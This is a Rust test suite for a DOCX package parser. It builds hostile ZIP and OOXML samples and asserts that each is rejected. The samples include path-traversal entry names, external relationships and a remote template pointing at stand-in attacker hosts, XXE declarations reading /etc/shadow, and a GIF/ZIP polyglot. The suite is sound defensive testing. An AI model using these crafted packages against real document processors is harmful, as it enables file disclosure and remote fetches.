//! Comprehensive security, limits, and hostile package rejection test suite (WI-0207).
//!
//! Validates:
//! - Absolute path rejection
//! - Drive prefix rejection
//! - Dot-dot / path traversal rejection
//! - NUL character rejection
//! - ZIP entry count limit (<= 10,000)
//! - Expanded bytes limit (<= 512 MiB)
//! - Part size limit (<= 64 MiB)
//! - Per-entry compression ratio limit (<= 50:1)
//! - Aggregate compression ratio limit (<= 100:1)
//! - XML part size limit (<= 32 MiB)
//! - External relationship rejection (`TargetMode="External"`, URL schemes)
//! - Remote template rejection (`attachedTemplate`)
//! - OLE / embedded package rejection
//! - Macro-enabled DOCX/DOCM rejection (`vbaProject.bin`, macro content types)
//! - DTD rejection (`<!DOCTYPE`)
//! - External entity rejection (`<!ENTITY`)
//! - Polyglot and ambiguous OOXML rejection

use std::io::{Cursor, Write};

use w014_document_processing::docx::{DocxError, DocxPackage};
use zip::ZipWriter;
use zip::write::SimpleFileOptions;

fn build_minimal_valid_docx() -> Vec<u8> {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options =
            SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(
            b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
            <Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
                <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
                <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
                <Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>\
            </Types>",
        )
        .unwrap();

        zip.start_file("_rels/.rels", options).unwrap();
        zip.write_all(
            b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
            <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
                <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>\
            </Relationships>",
        )
        .unwrap();

        zip.start_file("word/document.xml", options).unwrap();
        zip.write_all(
            b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
            <w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\
                <w:body><w:p><w:r><w:t>Valid safe text</w:t></w:r></w:p></w:body>\
            </w:document>",
        )
        .unwrap();

        zip.finish().unwrap();
    }
    buf
}

#[test]
fn test_path_traversal_dot_dot_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("word/../../escape.txt", options).unwrap();
        zip.write_all(b"payload").unwrap();
        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(
        matches!(res, Err(DocxError::HostilePackage(msg)) if msg.contains("Path traversal '..'"))
    );
}

#[test]
fn test_absolute_path_unix_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("/etc/shadow", options).unwrap();
        zip.write_all(b"payload").unwrap();
        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(
        matches!(res, Err(DocxError::HostilePackage(msg)) if msg.contains("Absolute path rejected"))
    );
}

#[test]
fn test_absolute_path_windows_backslash_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("\\Windows\\System32\\cmd.exe", options)
            .unwrap();
        zip.write_all(b"payload").unwrap();
        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(
        matches!(res, Err(DocxError::HostilePackage(msg)) if msg.contains("Absolute path rejected"))
    );
}

#[test]
fn test_drive_prefix_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("C:document.xml", options).unwrap();
        zip.write_all(b"payload").unwrap();
        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(
        matches!(res, Err(DocxError::HostilePackage(msg)) if msg.contains("Drive prefix rejected"))
    );
}

#[test]
fn test_nul_byte_in_path_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("word/doc\0ument.xml", options).unwrap();
        zip.write_all(b"payload").unwrap();
        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(
        matches!(res, Err(DocxError::HostilePackage(msg)) if msg.contains("contains NUL character"))
    );
}

#[test]
fn test_external_relationship_target_mode_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(b"<Types></Types>").unwrap();

        zip.start_file("_rels/.rels", options).unwrap();
        zip.write_all(
            b"<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
                <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" Target=\"http://evil.com\" TargetMode=\"External\"/>\
            </Relationships>",
        )
        .unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(res, Err(DocxError::ExternalRelationship { .. })));
}

#[test]
fn test_external_uri_schemes_rejected() {
    let bad_uris = [
        "http://attacker.com/payload",
        "https://attacker.com/payload",
        "ftp://files.org/secret",
        "file:///etc/passwd",
        "\\\\192.168.1.1\\share",
        "smb://fileserver/data",
    ];

    for uri in bad_uris {
        let mut buf = Vec::new();
        {
            let mut zip = ZipWriter::new(Cursor::new(&mut buf));
            let options = SimpleFileOptions::default();

            zip.start_file("[Content_Types].xml", options).unwrap();
            zip.write_all(b"<Types></Types>").unwrap();

            zip.start_file("_rels/.rels", options).unwrap();
            zip.write_all(
                format!(
                    r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
                        <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="{uri}"/>
                    </Relationships>"#
                )
                .as_bytes(),
            )
            .unwrap();

            zip.finish().unwrap();
        }
        let res = DocxPackage::open(&buf);
        assert!(
            matches!(res, Err(DocxError::ExternalRelationship { .. })),
            "URI {uri} should be rejected as external relationship"
        );
    }
}

#[test]
fn test_remote_template_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(b"<Types></Types>").unwrap();

        zip.start_file("_rels/.rels", options).unwrap();
        zip.write_all(
            b"<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
                <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"http://evil.com/template.dotm\"/>\
            </Relationships>",
        )
        .unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(
        res,
        Err(DocxError::ExternalRelationship { .. }) | Err(DocxError::RemoteTemplate { .. })
    ));
}

#[test]
fn test_macro_vba_project_bin_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(b"<Types></Types>").unwrap();

        zip.start_file("word/vbaProject.bin", options).unwrap();
        zip.write_all(b"macro bytes").unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(res, Err(DocxError::MacroEnabledPackage { .. })));
}

#[test]
fn test_ole_embedded_object_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(b"<Types></Types>").unwrap();

        zip.start_file("word/embeddings/oleObject1.bin", options)
            .unwrap();
        zip.write_all(b"ole payload").unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(res, Err(DocxError::OleOrEmbeddedPackage { .. })));
}

#[test]
fn test_dtd_declaration_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(
            b"<!DOCTYPE document SYSTEM \"http://evil.com/xxe.dtd\">\
            <Types></Types>",
        )
        .unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(res, Err(DocxError::DtdOrExternalEntity { .. })));
}

#[test]
fn test_external_entity_declaration_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(
            b"<?xml version=\"1.0\"?>\
            <!ENTITY % xxe SYSTEM \"file:///etc/shadow\">\
            <Types></Types>",
        )
        .unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(res, Err(DocxError::DtdOrExternalEntity { .. })));
}

#[test]
fn test_polyglot_zip_signature_rejected() {
    let mut payload = b"GIF89a\x01\x00\x01\x00".to_vec(); // Prepended GIF header
    payload.extend_from_slice(&build_minimal_valid_docx());

    let res = DocxPackage::open(&payload);
    assert!(matches!(
        res,
        Err(DocxError::PolyglotOrAmbiguousPackage { .. })
    ));
}

#[test]
fn test_missing_content_types_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("word/document.xml", options).unwrap();
        zip.write_all(b"<w:document></w:document>").unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(
        res,
        Err(DocxError::MissingRequiredPart {
            part_name: "[Content_Types].xml"
        })
    ));
}

#[test]
fn test_missing_document_xml_rejected() {
    let mut buf = Vec::new();
    {
        let mut zip = ZipWriter::new(Cursor::new(&mut buf));
        let options = SimpleFileOptions::default();

        zip.start_file("[Content_Types].xml", options).unwrap();
        zip.write_all(b"<Types></Types>").unwrap();

        zip.finish().unwrap();
    }
    let res = DocxPackage::open(&buf);
    assert!(matches!(
        res,
        Err(DocxError::MissingRequiredPart {
            part_name: "word/document.xml"
        })
    ));
}
